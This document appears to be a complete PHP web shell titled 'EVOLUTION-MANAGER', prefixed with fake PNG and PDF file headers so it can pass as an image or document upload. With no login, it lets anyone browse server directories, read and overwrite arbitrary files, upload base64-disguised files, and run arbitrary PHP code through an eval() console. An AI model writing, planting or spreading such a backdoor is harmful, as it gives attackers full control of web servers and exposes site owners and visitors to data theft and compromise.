‰PNG
%PDF-1.5
%����

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EVOLUTION-MANAGER</title>
<style>
    body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f4f4f9;
        color: #333;
    }
    #container {
        max-width: 1000px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    h1 {
        text-align: center;
        color: #2c3e50;
        font-size: 2.5em;
        margin-bottom: 20px;
    }
    h2 {
        color: #34495e;
        font-size: 1.8em;
        margin-top: 30px;
    }
    ul {
        list-style-type: none;
        padding: 0;
    }
    li {
        margin-bottom: 10px;
        padding: 10px;
        background-color: #ecf0f1;
        border-radius: 5px;
        transition: background-color 0.3s ease;
    }
    li:hover {
        background-color: #d5d8dc;
    }
    a {
        text-decoration: none;
        color: #2980b9;
        font-weight: bold;
    }
    a:hover {
        text-decoration: underline;
    }
    form {
        margin-top: 20px;
    }
    input[type="text"], input[type="file"], input[type="submit"], textarea {
        width: 100%;
        padding: 10px;
        margin-bottom: 15px;
        border: 1px solid #bdc3c7;
        border-radius: 5px;
        font-size: 1em;
    }
    input[type="submit"] {
        background-color: #3498db;
        color: white;
        border: none;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    input[type="submit"]:hover {
        background-color: #2980b9;
    }
    textarea {
        width: 100%;
        height: 150px;
        font-family: 'Courier New', Courier, monospace;
        font-size: 1em;
    }
    hr {
        border: 0;
        height: 1px;
        background-color: #bdc3c7;
        margin: 20px 0;
    }
    .console {
        background-color: #2c3e50;
        color: #ecf0f1;
        padding: 15px;
        border-radius: 5px;
        font-family: 'Courier New', Courier, monospace;
    }
</style>
<script>
    function encodeFileContent(fileInput) {
        const file = fileInput.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function (event) {
                const fileContent = event.target.result;
                const encodedContent = btoa(fileContent);
                const encodedFile = new File([encodedContent], file.name, { type: file.type });

                const dataTransfer = new DataTransfer();
                dataTransfer.items.add(encodedFile);
                fileInput.files = dataTransfer.files;

                console.log("File content encoded successfully!");
            };
            reader.readAsBinaryString(file);
        }
    }
</script>
</head>
<body>
<div id="container">
    <h1>EVOLUTION-MANAGER</h1>
    
    <?php
    function ทำความสะอาดข้อมูล($ข้อมูล) {
        return htmlspecialchars(strip_tags($ข้อมูล));
    }

    function นำทางไดเรกทอรี($เส้นทาง) {
        $เส้นทาง = str_replace('\\','/', $เส้นทาง);
        $เส้นทางทั้งหมด = explode('/', $เส้นทาง);
        $เส้นทางนำทาง = [];

        foreach ($เส้นทางทั้งหมด as $ไอดี => $เส้นทางย่อย) {
            if ($เส้นทางย่อย == '' && $ไอดี == 0) {
                $เส้นทางนำทาง[] = '<a href="?เส้นทาง=/">/</a>';
                continue;
            }
            if ($เส้นทางย่อย == '') continue;
            $เส้นทางนำทาง[] = '<a href="?เส้นทาง=';
            for ($i = 0; $i <= $ไอดี; $i++) {
                $เส้นทางนำทาง[] = "$เส้นทางทั้งหมด[$i]";
                if ($i != $ไอดี) $เส้นทางนำทาง[] = "/";
            }
            $เส้นทางนำทาง[] = '">'.$เส้นทางย่อย.'</a>/';
        }

        return implode('', $เส้นทางนำทาง);
    }

    function แสดงเนื้อหาไดเรกทอรี($เส้นทาง) {
        $เนื้อหา = scandir($เส้นทาง);
        $โฟลเดอร์ = [];
        $ไฟล์ = [];

        foreach ($เนื้อหา as $รายการ) {
            if ($รายการ == '.' || $รายการ == '..') continue;
            $เส้นทางเต็ม = $เส้นทาง . '/' . $รายการ;
            if (is_dir($เส้นทางเต็ม)) {
                $โฟลเดอร์[] = '<li><strong>Folder:</strong> <a href="?เส้นทาง=' . urlencode($เส้นทางเต็ม) . '">' . $รายการ . '</a></li>';
            } else {
                $ขนาดไฟล์ = filesize($เส้นทางเต็ม);
                $หน่วยขนาด = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
                $ขนาดไฟล์ที่จัดรูปแบบ = $ขนาดไฟล์ ? round($ขนาดไฟล์ / pow(1024, ($i = floor(log($ขนาดไฟล์, 1024)))), 2) . ' ' . $หน่วยขนาด[$i] : '0 B';
                $ไฟล์[] = '<li><strong>File:</strong> <a href="?action=แก้ไข&ไฟล์=' . urlencode($รายการ) . '&เส้นทาง=' . urlencode($เส้นทาง) . '">' . $รายการ . '</a> (' . $ขนาดไฟล์ที่จัดรูปแบบ . ')</li>';
            }
        }

        echo '<ul>';
        echo implode('', $โฟลเดอร์);
        if (!empty($โฟลเดอร์) && !empty($ไฟล์)) {
            echo '<hr>';
        }
        echo implode('', $ไฟล์);
        echo '</ul>';
    }

    function สร้างโฟลเดอร์($เส้นทาง, $ชื่อโฟลเดอร์) {
        $ชื่อโฟลเดอร์ = ทำความสะอาดข้อมูล($ชื่อโฟลเดอร์);
        $เส้นทางโฟลเดอร์ใหม่ = $เส้นทาง . '/' . $ชื่อโฟลเดอร์;
        if (!file_exists($เส้นทางโฟลเดอร์ใหม่)) {
            mkdir($เส้นทางโฟลเดอร์ใหม่);
            echo "Folder '$ชื่อโฟลเดอร์' created successfully!";
        } else {
            echo "Folder '$ชื่อโฟลเดอร์' already exists!";
        }
    }

    function อัปโหลดไฟล์($เส้นทาง, $ไฟล์ที่จะอัปโหลด) {
        $ไดเรกทอรีเป้าหมาย = $เส้นทาง . '/';
        $ไฟล์เป้าหมาย = $ไดเรกทอรีเป้าหมาย . basename($ไฟล์ที่จะอัปโหลด['name']);
        $encodedContent = file_get_contents($ไฟล์ที่จะอัปโหลด['tmp_name']);
        $decodedContent = base64_decode($encodedContent);

        if (file_put_contents($ไฟล์เป้าหมาย, $decodedContent)) {
            echo "File uploaded successfully!";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }

    function แก้ไขไฟล์($เส้นทางไฟล์) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $เนื้อหา = $_POST['เนื้อหาไฟล์'];
            if (file_put_contents($เส้นทางไฟล์, $เนื้อหา) !== false) {
                echo "File saved successfully.";
            } else {
                echo "There was an error while saving the file.";
            }
        }
        $เนื้อหา = file_get_contents($เส้นทางไฟล์);
        echo '<form method="post">';
        echo '<textarea name="เนื้อหาไฟล์" rows="10" cols="50">' . htmlspecialchars($เนื้อหา) . '</textarea><br>';
        echo '<input type="submit" value="Save">';
        echo '</form>';
    }

    function รันโค้ดPHP($โค้ด) {
        $โค้ดที่ทำความสะอาด = trim($โค้ด);
        try {
            eval($โค้ดที่ทำความสะอาด);
        } catch (ParseError $e) {
            echo "Error in PHP code: " . htmlspecialchars($e->getMessage());
        }
    }

    if (isset($_GET['เส้นทาง'])) {
        $เส้นทาง = $_GET['เส้นทาง'];
    } else {
        $เส้นทาง = getcwd();
    }

    if (isset($_GET['action'])) {
        $การกระทำ = $_GET['action'];
        switch ($การกระทำ) {
            case 'แก้ไข':
                if (isset($_GET['ไฟล์'])) {
                    $ไฟล์ = $_GET['ไฟล์'];
                    $เส้นทางไฟล์ = $เส้นทาง . '/' . $ไฟล์;
                    if (file_exists($เส้นทางไฟล์)) {
                        echo '<h2>Edit File: ' . $ไฟล์ . '</h2>';
                        แก้ไขไฟล์($เส้นทางไฟล์);
                    } else {
                        echo "File not found.";
                    }
                } else {
                    echo "Invalid file.";
                }
                break;
            default:
                echo "Invalid action.";
        }
    } else {
        echo "<h2>Directory: " . $เส้นทาง . "</h2>";
        echo "<p>" . นำทางไดเรกทอรี($เส้นทาง) . "</p>";
        echo "<h3>Directory Contents:</h3>";
        แสดงเนื้อหาไดเรกทอรี($เส้นทาง);
        echo '<hr>';
        echo '<h3>Create New Folder:</h3>';
        echo '<form action="" method="post">';
        echo 'New Folder Name: <input type="text" name="ชื่อโฟลเดอร์">';
        echo '<input type="submit" name="สร้างโฟลเดอร์" value="Create Folder">';
        echo '</form>';
        echo '<h3>Upload New File:</h3>';
        echo '<form action="" method="post" enctype="multipart/form-data" onsubmit="return confirm(\'Are you sure you want to upload this file?\');">';
        echo 'Select file to upload: <input type="file" name="ไฟล์ที่จะอัปโหลด" onchange="encodeFileContent(this)" required>';
        echo '<input type="submit" name="อัปโหลดไฟล์" value="Upload File">';
        echo '</form>';

        echo '<hr>';
        echo '<h3>PHP Console:</h3>';
        echo '<form action="" method="post">';
        echo 'Enter PHP code:<br>';
        echo '<textarea name="โค้ดPHP" class="console"></textarea><br>';
        echo '<input type="submit" name="รันโค้ดPHP" value="Execute PHP Code">';
        echo '</form>';

        if (isset($_POST['รันโค้ดPHP'])) {
            $โค้ดPHP = $_POST['โค้ดPHP'];
            echo '<h3>Execution Result:</h3>';
            echo '<div class="console">';
            รันโค้ดPHP($โค้ดPHP);
            echo '</div>';
        }
    }

    if(isset($_POST['สร้างโฟลเดอร์'])) {
        สร้างโฟลเดอร์($เส้นทาง, $_POST['ชื่อโฟลเดอร์']);
    }

    if(isset($_POST['อัปโหลดไฟล์'])) {
        อัปโหลดไฟล์($เส้นทาง, $_FILES['ไฟล์ที่จะอัปโหลด']);
    }
    ?>
</div>
</body>
</html>
